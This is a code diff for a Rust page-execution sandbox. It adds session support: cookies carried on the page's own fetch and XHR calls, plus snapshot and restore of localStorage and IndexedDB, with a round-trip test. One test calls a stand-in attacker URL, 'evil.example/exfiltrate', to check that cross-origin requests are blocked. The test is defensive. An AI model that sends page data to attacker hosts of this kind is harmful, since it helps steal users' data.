@@ -56,6 +56,8 @@ const STORAGE_JS: &str = include_str!("js/vendor/storage.js");
 const FETCH_JS: &str = include_str!("js/vendor/fetch.js");
 /// document.modelContext, per the W3C IDL.
 const SHIM_JS: &str = include_str!("js/shim.js");
+/// Snapshot and restore of localStorage and IndexedDB, for named sessions.
+const SESSION_JS: &str = include_str!("js/session.js");
 
 /// What happened while running a page, beyond the tools themselves.
 #[derive(Debug, Default, Clone, serde::Serialize)]
@@ -189,6 +191,7 @@ pub fn collect_script_refs(html: &str, base: &url::Url) -> (Vec<Script>, Vec<(us
 /// page sees a normal network failure and conduit records why.
 fn http_request(
     page_origin: &str,
+    jar: Option<&crate::cookies::SharedJar>,
     method: &str,
     url: &str,
     headers_json: &str,
@@ -217,6 +220,12 @@ fn http_request(
         }
     }
 
+    // The page's own XHR and fetch are where a signed-in app actually talks to
+    // its API, so they carry the session's cookies like any other request.
+    if let Some(header) = jar.and_then(|j| j.lock().ok()?.header_for(&parsed)) {
+        req = req.set("Cookie", &header);
+    }
+
     let sent = if body.is_empty() {
         req.call()
     } else {
@@ -239,6 +248,15 @@ fn http_request(
         Err(ureq::Error::Status(_, r)) => r,
         Err(e) => return fail(format!("{e}")),
     };
+
+    if let Some(jar) = jar {
+        if let Ok(mut jar) = jar.lock() {
+            let target = url::Url::parse(resp.get_url()).unwrap_or_else(|_| parsed.clone());
+            for value in resp.all("set-cookie") {
+                jar.store(&target, value);
+            }
+        }
+    }
 
     let status = resp.status();
     let status_text = resp.status_text().to_string();
@@ -499,6 +517,8 @@ impl Page {
         doc_base: &url::Url,
         scripts: Vec<Script>,
         modules: HashMap<String, String>,
+        session: Option<&str>,
+        jar: Option<crate::cookies::SharedJar>,
     ) -> Result<Self> {
         let rt = Runtime::new().context("creating QuickJS runtime")?;
         // Page scripts are untrusted. Cap memory and stack so a hostile or
@@ -599,10 +619,11 @@ impl Page {
             // interleave with, and a blocking call keeps the whole engine
             // single-threaded and free of a second async runtime.
             let page_origin = origin.clone();
+            let page_jar = jar.clone();
             let http = Function::new(
                 ctx.clone(),
                 move |method: String, url: String, headers_json: String, body: String| -> String {
-                    http_request(&page_origin, &method, &url, &headers_json, &body)
+                    http_request(&page_origin, page_jar.as_ref(), &method, &url, &headers_json, &body)
                 },
             )?;
             ctx.globals().set("__conduit_http", http)?;
@@ -626,6 +647,12 @@ impl Page {
             // which arrives with happy-dom.
             ctx.eval::<(), _>(STORAGE_JS)
                 .map_err(|e| anyhow!("storage.js: {}", describe_exception(&ctx, &e.to_string())))?;
+
+            // After storage.js, because it drives the very objects that file
+            // installs, and before the document is parsed, so a restored
+            // session is already in place when page scripts first look.
+            ctx.eval::<(), _>(SESSION_JS)
+                .map_err(|e| anyhow!("session.js: {}", describe_exception(&ctx, &e.to_string())))?;
 
             ctx.eval::<(), _>(HOST_FETCH_JS)
                 .map_err(|e| anyhow!("host-fetch.js: {}", describe_exception(&ctx, &e.to_string())))?;
@@ -654,6 +681,14 @@ impl Page {
             module_misses: misses,
         };
 
+        // A restored session has to be in place before the first page script
+        // runs: a local-first app reads its database during boot, and storage
+        // that arrives afterwards is storage the app has already concluded is
+        // empty.
+        if let Some(state) = session {
+            page.import_session(state)?;
+        }
+
         // Browsers run classic scripts as they are parsed and defer modules
         // until afterwards. Mirroring that order matters: inline classic code
         // frequently sets up globals a module then expects to find.
@@ -677,6 +712,85 @@ impl Page {
         page.collect_diagnostics();
 
         Ok(page)
+    }
+
+    /// Restore a session's storage into this page.
+    ///
+    /// The work is asynchronous — IndexedDB has no synchronous API — and the
+    /// engine has no async entry point, so this starts the work and settles the
+    /// event loop until `session.js` reports it finished.
+    pub fn import_session(&mut self, state_json: &str) -> Result<()> {
+        self.ctx.with(|ctx| -> Result<()> {
+            let import: Function = ctx
+                .globals()
+                .get("__conduit_session_import")
+                .map_err(|e| anyhow!("session support missing: {e}"))?;
+            import.call::<_, ()>((state_json,)).map_err(|e| {
+                anyhow!(
+                    "restoring session: {}",
+                    describe_exception(&ctx, &e.to_string())
+                )
+            })
+        })?;
+
+        self.settle_session("restoring session")
+    }
+
+    /// Snapshot this page's storage.
+    pub fn export_session(&mut self) -> Result<String> {
+        // Settle first. A tool call that opened a database leaves the request
+        // callbacks queued, and snapshotting before they run reads a store that
+        // does not exist yet — the write is simply missing from the session,
+        // with nothing to indicate it was lost.
+        self.settle();
+
+        self.ctx.with(|ctx| -> Result<()> {
+            let export: Function = ctx
+                .globals()
+                .get("__conduit_session_export")
+                .map_err(|e| anyhow!("session support missing: {e}"))?;
+            export.call::<_, ()>(()).map_err(|e| {
+                anyhow!(
+                    "snapshotting session: {}",
+                    describe_exception(&ctx, &e.to_string())
+                )
+            })
+        })?;
+
+        self.settle_session("snapshotting session")?;
+
+        self.ctx.with(|ctx| {
+            ctx.globals()
+                .get::<_, String>("__conduit_session_out")
+                .map_err(|e| anyhow!("reading session snapshot: {e}"))
+        })
+    }
+
+    /// Drive the loop until `session.js` sets its done flag, then surface any
+    /// error it recorded. Without the flag a failure inside the async body
+    /// would be indistinguishable from an empty session.
+    fn settle_session(&mut self, what: &str) -> Result<()> {
+        self.settle();
+
+        let (done, error) = self.ctx.with(|ctx| {
+            let done = ctx
+                .globals()
+                .get::<_, bool>("__conduit_session_done")
+                .unwrap_or(false);
+            let error = ctx
+                .globals()
+                .get::<_, String>("__conduit_session_error")
+                .unwrap_or_default();
+            (done, error)
+        });
+
+        if !done {
+            return Err(anyhow!("{what}: the page never finished settling"));
+        }
+        if !error.is_empty() {
+            return Err(anyhow!("{what}: {error}"));
+        }
+        Ok(())
     }
 
     /// Run one page script. A failure is recorded and execution continues:
@@ -950,7 +1064,7 @@ mod tests {
             external.is_empty(),
             "fixture should have no external scripts"
         );
-        Page::load(TODO, &url, &url, scripts, HashMap::new()).expect("page should load")
+        Page::load(TODO, &url, &url, scripts, HashMap::new(), None, None).expect("page should load")
     }
 
     fn load_module_fixture() -> Page {
@@ -961,7 +1075,8 @@ mod tests {
             scripts.iter().any(|s| s.is_module),
             "fixture must use a module"
         );
-        Page::load(MODULE_TODO, &url, &url, scripts, HashMap::new()).expect("page should load")
+        Page::load(MODULE_TODO, &url, &url, scripts, HashMap::new(), None, None)
+            .expect("page should load")
     }
 
     #[test]
@@ -1096,7 +1211,7 @@ mod tests {
             import "./never-fetched.js";
         </script></body></html>"#;
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new()).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics
                 .unresolved_modules
@@ -1226,6 +1341,7 @@ mod tests {
         // party is not.
         let out = http_request(
             "https://app.example",
+            None,
             "GET",
             "https://evil.example/exfiltrate",
             "{}",
@@ -1257,7 +1373,7 @@ mod tests {
         let url = url::Url::parse("https://plain.example/").unwrap();
         let html = "<html><body><script>var x = 1;</script></body></html>";
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new()).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert_eq!(page.diagnostics.model_context_lookups, 0);
         assert_eq!(page.diagnostics.register_calls, 0);
         assert_eq!(page.diagnostics.scripts_failed, 0);
@@ -1274,7 +1390,7 @@ mod tests {
             document.modelContext.getTools().then(function(){});
         </script></body></html>"#;
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new()).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert_eq!(page.diagnostics.register_calls, 0);
         assert!(
             page.diagnostics.consume_calls > 0,
@@ -1308,6 +1424,97 @@ mod tests {
         assert_eq!(a.len(), 36, "got {a}");
         assert_eq!(&a[14..15], "4", "version nibble: {a}");
         assert_ne!(a, b, "randomUUID must not repeat");
+    }
+
+    /// The session round trip, through the two bugs that actually broke it:
+    /// a transaction that commits between two awaits, and a success event that
+    /// fires before anything is listening for it.
+    #[test]
+    fn a_session_round_trips_storage_through_json() {
+        const WRITES: &str = r#"<!doctype html><html><body><script>
+          var r = indexedDB.open("app", 1);
+          r.onupgradeneeded = function () {
+            var s = r.result.createObjectStore("items", { keyPath: "id", autoIncrement: true });
+            s.createIndex("by_text", "text", { unique: false });
+          };
+          r.onsuccess = function () {
+            var tx = r.result.transaction("items", "readwrite");
+            tx.objectStore("items").add({ text: "hello", when: new Date(1700000000000) });
+            tx.objectStore("items").add({ text: "world", when: new Date(1700000001000) });
+            tx.oncomplete = function () { r.result.close(); };
+          };
+          localStorage.setItem("token", "abc");
+        </script></body></html>"#;
+
+        const READS: &str = r#"<!doctype html><html><body><script>
+          window.__seen = "pending";
+          var r = indexedDB.open("app", 1);
+          r.onupgradeneeded = function () {
+            r.result.createObjectStore("items", { keyPath: "id", autoIncrement: true });
+          };
+          r.onsuccess = function () {
+            var q = r.result.transaction("items", "readonly").objectStore("items").getAll();
+            q.onsuccess = function () {
+              window.__seen = JSON.stringify({
+                token: localStorage.getItem("token"),
+                texts: q.result.map(function (i) { return i.text; }),
+                // A Date that came back as a string would mean the encoding
+                // silently degraded to JSON.
+                dateIsDate: q.result.length > 0 && q.result[0].when instanceof Date,
+              });
+            };
+          };
+        </script></body></html>"#;
+
+        let url = url::Url::parse("https://example.com/app").unwrap();
+
+        let (scripts, _) = collect_script_refs(WRITES, &url);
+        let mut writer = Page::load(WRITES, &url, &url, scripts, HashMap::new(), None, None)
+            .expect("writer loads");
+        let snapshot = writer.export_session().expect("snapshot succeeds");
+        assert!(
+            snapshot.contains("hello") && snapshot.contains("world"),
+            "records should be in the snapshot: {snapshot}"
+        );
+
+        // A fresh page, given the snapshot, must see the data before its own
+        // scripts run — that is the whole contract.
+        let (scripts, _) = collect_script_refs(READS, &url);
+        let restored = Page::load(
+            READS,
+            &url,
+            &url,
+            scripts,
+            HashMap::new(),
+            Some(snapshot.as_str()),
+            None,
+        )
+        .expect("restored page loads");
+
+        let seen = restored.eval_debug("window.__seen").unwrap();
+        assert!(
+            seen.contains("\"token\":\"abc\""),
+            "localStorage lost: {seen}"
+        );
+        assert!(
+            seen.contains("hello") && seen.contains("world"),
+            "records lost: {seen}"
+        );
+        assert!(
+            seen.contains("\"dateIsDate\":true"),
+            "Date degraded to a string: {seen}"
+        );
+
+        // Without the snapshot the same page must see nothing, or the two
+        // sessions are not actually isolated.
+        let (scripts, _) = collect_script_refs(READS, &url);
+        let empty = Page::load(READS, &url, &url, scripts, HashMap::new(), None, None)
+            .expect("empty page loads");
+        let seen = empty.eval_debug("window.__seen").unwrap();
+        assert!(
+            seen.contains("\"texts\":[]"),
+            "a sessionless page saw data: {seen}"
+        );
     }
 
     #[test]
@@ -1394,7 +1601,7 @@ mod tests {
         assert_eq!(external.len(), 1, "fixture loads one external bundle");
         scripts[external[0].0].source = bundle.to_string();
 
-        let page = Page::load(html, &url, &url, scripts, HashMap::new()).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics.script_errors.is_empty(),
             "unexpected errors: {:?}",
@@ -1436,7 +1643,7 @@ mod tests {
         assert_eq!(external.len(), 1, "fixture loads one module bundle");
         scripts[external[0].0].source = bundle.to_string();
 
-        let page = Page::load(html, &url, &url, scripts, HashMap::new()).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics.script_errors.is_empty(),
             "unexpected errors: {:?}",
